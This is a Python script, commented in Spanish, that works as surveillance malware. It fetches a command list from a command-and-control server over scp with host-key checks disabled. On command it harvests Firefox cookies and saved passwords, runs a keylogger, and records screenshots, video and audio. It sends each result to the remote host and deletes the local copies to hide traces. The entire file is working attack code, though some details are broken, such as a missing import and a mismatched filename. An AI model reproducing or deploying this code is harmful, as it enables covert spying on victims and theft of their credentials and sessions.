#!/usr/bin/python

import os, re
import capaudio
import captura
import capvideo
import keylogger



#Lista donde se almacenaran los comandos leidos del archivo
comandos = [ ]

#copiamos el archivo que contiene los comandos desde el comand an control
os.system("scp -q -o StrictHostKeyChecking=no manavi@192.168.222.13:~/comandos.txt /tmp 1>/dev/null")

if os.path.exists("/tmp/comandos.txt"):
        #Leemos el archivo
        inputfile = open('/tmp/comandos.txt')

	for line in inputfile:
                print line 
		comandos.append(line)
	 
        inputfile.close()
print len(comandos)
#En caso de que el archivo este vacio cerramos el programa
if len(comandos) == 0:
        sys.exit() 

#borramos el archivo una vez obtenidos los comandos
os.system("rm -f /tmp/comandos.txt")

#Ejecutamos cada uno de los comandos y enviamos al comand and control los archivos generados
#por scp -q -o StrictHostKeyChecking=no

for c in comandos:
    c = c.strip("\n")
    if c == "cookies":
 		print c+"\n"
       		os.system("python firecookies.py")	
                os.system('scp -q -o StrictHostKeyChecking=no /tmp/cookies.txt manavi@192.168.222.13:~/cookies/ 1>/dev/null')
                os.system('rm -f /tmp/cookies.txt')

    elif c == "contrasenas":
		print c+"\n"
       		os.system("python firepass.py")
                os.system('scp -q -o StrictHostKeyChecking=no /tmp/firepass.txt manavi@192.168.222.13:~/contrasenas/ 1>/dev/null')
                os.system('rm -f /tmp/firepass.txt')

    elif re.search('keylogger',c):
		print c+"\n"
                mo = re.match('keylogger (\d+)',c)
        	keylogger.keylog(mo.group(1))
                os.system('scp -q -o StrictHostKeyChecking=no /tmp/key.txt manavi@192.168.222.13:~/keylogger/ 1>/dev/null')
                os.system('rm -f /tmp/key.txt')
    
    elif re.search('captura',c):
		print c+"\n"
                mo = re.match('captura (\-[tn]{1,1}) (\d+)',c);
                captura.tiempo(mo.group(1),mo.group(2))
                os.system('scp -q -o StrictHostKeyChecking=no /tmp/*.png manavi@192.168.222.13:~/capturas/ 1>/dev/null')
                os.system('rm -f /tmp/*.png')

 
    elif re.search('captvid',c):
		print c+"\n"
                mo = re.match('captvid (\d+)',c);
                capvideo.video(mo.group(1))
                os.system('scp -q -o StrictHostKeyChecking=no /tmp/*.mpeg manavi@192.168.222.13:~/video/ 1>/dev/null')
                os.system('rm -f /tmp/*.mpeg')
    
    elif re.search('captaud',c):
		print c+"\n"
                mo = re.match('captaud (\d+)',c);
                capaudio.audio(mo.group(1))
                os.system('scp -q -o StrictHostKeyChecking=no /tmp/*.wav manavi@192.168.222.13:~/audio/ 1>/dev/null')
                os.system('rm -f /tmp/*.wav')

    #si el comando no es valido no se manda un archivo con los comandos no validos
    else :
                fo = open("/tmp/comandosnovalidos.txt","a")
    		fo.write(c + "\n")
		fo.close() 


if os.path.exists("/tmp/comandosnovalidos"):
	os.system('scp -q -o StrictHostKeyChecking=no /tmp/comandosnovalidos.txt manavi@192.168.222.13:~/error/ 1>/dev/null')
	os.system('rm -f /tmp/comandosnovalidos.txt')
